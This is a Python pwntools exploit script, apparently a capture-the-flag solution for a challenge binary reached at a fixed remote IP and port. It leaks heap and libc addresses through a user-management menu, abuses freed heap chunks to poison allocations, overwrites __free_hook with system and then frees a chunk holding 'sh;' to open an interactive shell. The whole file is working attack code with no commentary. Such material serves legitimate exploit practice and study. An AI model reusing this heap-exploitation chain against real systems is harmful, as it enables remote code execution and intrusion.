from pwn import *

exe = ELF("pwnable_3_patched", checksec=False)
libc = ELF("libc.so.6", checksec=False)
context.binary = exe

if args.LOCAL:
    r = process(exe.path, aslr=False)
else:
    r = remote("103.197.184.48", 13339)


input()
r.sendlineafter(b"> ", b"4")
r.sendafter(b"username > ", b"root\x00")
r.sendafter(b"password > ", p64(0x561))


r.sendlineafter(b"> ", b"1")
r.sendlineafter(b"> ", b"1")
r.sendlineafter(b"> ", b"1")

r.sendlineafter(b"> ", b"2")
r.sendafter(b"username > ", b"gnas\x00")
r.sendafter(b"password > ", b"gnasAAAA")


r.sendlineafter(b"> ", b"5")

r.recvuntil(b"gnasAAAA")
heap = u64(r.recv(6)+b"\x00"*2)-0x8E0
print("[*] heap: ", hex(heap))


r.sendlineafter(b"> ", b"2")
r.sendafter(b"username > ", b"gnas1\x00")
r.sendafter(b"password > ", b"gnas1\x00")

### delete user

r.sendlineafter(b"> ", b"3")
r.sendafter(b"username > ", b"gnas1\x00")

r.sendlineafter(b"> ", b"3")
r.sendafter(b"username > ", b"root\x00")


r.sendlineafter(b"> ", b"3")
r.sendafter(b"username > ", b"gnas\x00")



r.sendlineafter(b"> ", b"4")
r.sendafter(b"username > ", p64(heap+0xae0))
r.sendafter(b"password > ", b"dbfree")


r.sendlineafter(b"> ", b"3")
r.sendafter(b"username > ", p64(heap+0xae0))

fake_chunk_addr = heap + 0x380

r.sendlineafter(b"> ", b"2")
r.sendafter(b"username > ", p64(fake_chunk_addr))
r.sendafter(b"password > ", p64(heap + 0x10))

r.sendlineafter(b"> ", b"2")
r.sendafter(b"username > ", b"gnas\x00")
r.sendafter(b"password > ", b"gnas\x00")

r.sendlineafter(b"> ", b"2")
r.sendafter(b"username > ", b"gnas1\x00")
r.sendafter(b"password > ", b"gnas1\x00")


r.sendlineafter(b"> ", b"2")
r.sendafter(b"username > ", b"fake\x00")
r.sendafter(b"password > ", b"fake\x00")


r.sendlineafter(b"> ", b"3")
r.sendafter(b"username > ", b"fake\x00")


#input()
r.sendlineafter(b"> ", b"2")
r.sendafter(b"username > ", b"A")
r.sendafter(b"password > ", b"A")


r.sendlineafter(b"> ", b"5")
r.recvuntil(b": ")
libc_addr = (u64(r.recv(6)+b"\x00\x00") & 0xFFFFFFFFFFFFFF00) - 0x1ed000
print("[*] libc: ", hex(libc_addr))




r.sendlineafter(b"> ", b"1")

r.sendlineafter(b"> ", b"2")
r.sendafter(b"username > ", b"gnas\x00")
r.sendafter(b"password > ", b"gnas\x00")

r.sendlineafter(b"> ", b"2")
r.sendafter(b"username > ", b"gnas1\x00")
r.sendafter(b"password > ", b"gnas1\x00")



### delete user

r.sendlineafter(b"> ", b"3")
r.sendafter(b"username > ", b"gnas1\x00")


#input()
r.sendlineafter(b"> ", b"3")
r.sendafter(b"username > ", b"root\x00") # offset 0x3b0


r.sendlineafter(b"> ", b"3")
r.sendafter(b"username > ", b"gnas\x00")


r.sendlineafter(b"> ", b"4")
r.sendafter(b"username > ", p64(heap+0x5b0))
r.sendafter(b"password > ", b"dbfree")


r.sendlineafter(b"> ", b"3")
r.sendafter(b"username > ", p64(heap+0x5b0))


free_hook = libc_addr + 0x1eee48
system_addr = libc_addr + 0x52290


fake_chunk_addr = free_hook - 0x8

r.sendlineafter(b"> ", b"2")
r.sendafter(b"username > ", p64(fake_chunk_addr))
r.sendafter(b"password > ", p64(heap + 0x10))

r.sendlineafter(b"> ", b"2")
r.sendafter(b"username > ", b"gnas\x00")
r.sendafter(b"password > ", b"gnas\x00")

r.sendlineafter(b"> ", b"2")
r.sendafter(b"username > ", b"gnas1\x00")
r.sendafter(b"password > ", b"gnas1\x00")


r.sendlineafter(b"> ", b"2")
r.sendafter(b"username > ", b"sh;\x00")
r.sendafter(b"password > ", p64(system_addr))

r.sendlineafter(b"> ", b"3")
r.sendafter(b"username > ", b"sh;\x00")
r.interactive()